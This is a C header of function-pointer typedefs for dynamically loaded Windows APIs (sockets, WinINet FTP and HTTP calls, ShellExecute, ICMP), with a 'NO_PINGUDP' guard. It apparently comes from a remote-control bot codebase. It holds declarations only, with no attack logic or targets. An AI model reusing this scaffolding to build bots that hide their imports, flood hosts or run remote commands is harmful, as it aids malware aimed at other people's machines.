// kernel32.dll function variables
typedef BOOL (__stdcall *GCNA)(LPTSTR,LPDWORD);

// user32.dll function variables
typedef BOOL (__stdcall *IW)(HWND);

// ws2_32.dll function variables
typedef int (__stdcall *WSAS)(WORD,LPWSADATA);
typedef SOCKET (__stdcall *WSASo)(int,int,int,LPWSAPROTOCOL_INFO,GROUP,DWORD);
typedef int (__stdcall *WSAGLE)(void);
typedef int (__stdcall *WSAC)(void);
typedef SOCKET (__stdcall *SOCK)(int,int,int);
typedef int (__stdcall *CON)(SOCKET,const struct sockaddr *,int);
typedef char * FAR (__stdcall *INTOA)(struct in_addr);
typedef unsigned long (__stdcall *IADDR)(const char *);
typedef u_short (__stdcall *HTONS)(u_short);
typedef u_long (__stdcall *HTONL)(u_long);
typedef int (__stdcall *SEND)(SOCKET,const char *,int,int);
typedef int (__stdcall *SENDTO)(SOCKET,const char *,int,int,const struct sockaddr *,int);
typedef int (__stdcall *RECV)(SOCKET,char *,int,int);
typedef int (__stdcall *SSO)(SOCKET,int,int,const char *,int);
typedef int (__stdcall *GSN)(SOCKET,struct sockaddr *,int *);
typedef int (__stdcall *GHN)(char *,int);
typedef struct hostent* FAR (__stdcall *GHBN)(const char *);
typedef int (__stdcall *GPN)(SOCKET,struct sockaddr*,int*);
typedef int (__stdcall *CLSO)(SOCKET);
typedef int (__stdcall *SD)(SOCKET,int);

// wininet.dll function variables
typedef BOOL (__stdcall *IGCSE)(LPDWORD,LPTSTR,DWORD,DWORD);
typedef BOOL (__stdcall *IGCS)(LPDWORD,DWORD);
typedef HINTERNET (__stdcall *HOR)(HINTERNET,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR *,DWORD,PDWORD);
typedef BOOL (__stdcall *HSR)(HINTERNET,LPCTSTR,DWORD,LPVOID,DWORD);
typedef BOOL (__stdcall *FGF)(HINTERNET,LPCTSTR,LPCTSTR,BOOL,DWORD,DWORD,DWORD);
typedef BOOL (__stdcall *FPF)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD);
typedef HINTERNET (__stdcall *IC)(HINTERNET,LPCTSTR,INTERNET_PORT,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef HINTERNET (__stdcall *IO)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
typedef HINTERNET (__stdcall *IOU)(HINTERNET,LPCTSTR,LPCTSTR,DWORD,DWORD,PDWORD);
typedef BOOL (__stdcall *ICU)(LPCTSTR,DWORD,DWORD,LPURL_COMPONENTS);
typedef BOOL (__stdcall *IRF)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (__stdcall *ICH)(HINTERNET);

// shell32.dll function variables
typedef HINSTANCE (__stdcall *SE)(HWND,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,INT);
typedef void (__stdcall *SHCN)(LONG,UINT,LPCVOID,LPCVOID);

//shlwapi.dll function variables
typedef BOOL (__stdcall *PRFS)(LPTSTR);


// icmp.dll function variables
#ifndef NO_PINGUDP
typedef ULONG IPAddr;
typedef HANDLE (__stdcall *ICF)(VOID);
typedef DWORD (__stdcall *ISE)(HANDLE,IPAddr,LPVOID,WORD,PIP_OPTION_INFORMATION,LPVOID,DWORD,DWORD);
typedef BOOL (__stdcall *ICH)(HANDLE);
#endif

BOOL LoadDLLs(void);
